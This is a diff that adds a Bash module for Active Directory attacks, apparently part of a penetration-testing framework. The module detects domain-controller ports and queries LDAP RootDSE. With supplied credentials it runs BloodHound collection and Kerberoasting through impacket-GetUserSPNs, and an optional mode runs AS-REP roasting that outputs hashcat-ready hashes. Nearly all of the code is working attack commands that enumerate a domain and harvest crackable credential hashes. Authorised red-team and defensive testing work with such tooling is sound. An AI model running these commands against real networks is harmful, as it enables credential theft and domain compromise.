@@ -1,0 +1,60 @@
+#!/usr/bin/env bash
+
+module_meta(){ echo "ad|1.0|medium"; }
+
+module_detect(){
+  local facts="$1"
+  # shellcheck disable=SC1090
+  source "$facts"
+  [[ ",$OPEN_TCP," =~ ,88,|,389,|,636,|,3268,|,3269, ]] && return 0
+  [[ ",$OPEN_TCP," =~ ,445, ]] && [[ ",$OPEN_TCP," =~ ,53, ]] && return 0
+  return 1
+}
+
+module_run(){
+  local facts="$1" out="$2" scans="$3"
+  # shellcheck disable=SC1090
+  source "$facts"
+
+  mkdir -p "$out"
+  local logf="$out/ad.log"
+  : > "$logf"
+
+  # RootDSE is low-noise, often works without creds
+  if command -v ldapsearch >/dev/null 2>&1; then
+    run_cmd "ldap_rootdse" 30 "$logf" -- \
+      "ldapsearch -x -H ldap://$HOST -s base -b '' '(objectClass=*)' namingContexts defaultNamingContext"
+  else
+    echo "[!] ldapsearch not found; skipping RootDSE." >> "$logf"
+  fi
+
+  # Authenticated actions only if creds provided
+  if [[ -n "${DOMAIN:-}" && -n "${USER:-}" && -n "${PASS:-}" ]]; then
+    echo "[*] Creds present: $DOMAIN\\$USER" >> "$logf"
+
+    # bloodhound if available
+    if command -v bloodhound-python >/dev/null 2>&1; then
+      local dc="${DC_IP:-$HOST}"
+      run_cmd "bloodhound_collect" 600 "$logf" -- \
+        "cd '$out' && bloodhound-python -u '$USER' -p '$PASS' -d '$DOMAIN' -dc '$dc' -c All --zip"
+    fi
+
+    # kerberoast if available
+    if command -v impacket-GetUserSPNs >/dev/null 2>&1; then
+      local dc="${DC_IP:-$HOST}"
+      run_cmd "kerberoast_spns" 180 "$logf" -- \
+        "impacket-GetUserSPNs '${DOMAIN}/${USER}:${PASS}' -dc-ip '$dc' -request"
+    fi
+  else
+    echo "[*] No creds provided; skipping authenticated AD collection." >> "$logf"
+  fi
+
+  # Louder optional: ASREPRoast needs userlist + explicitly enabled
+  if [[ "${ENABLE_BRUTE:-0}" == "1" && -n "${USERLIST:-}" && -f "${USERLIST:-}" ]]; then
+    if command -v impacket-GetNPUsers >/dev/null 2>&1; then
+      local dc="${DC_IP:-$HOST}"
+      run_cmd "asrep_candidates" 240 "$logf" -- \
+        "impacket-GetNPUsers '${DOMAIN}/' -dc-ip '$dc' -usersfile '$USERLIST' -format hashcat"
+    fi
+  fi
+}
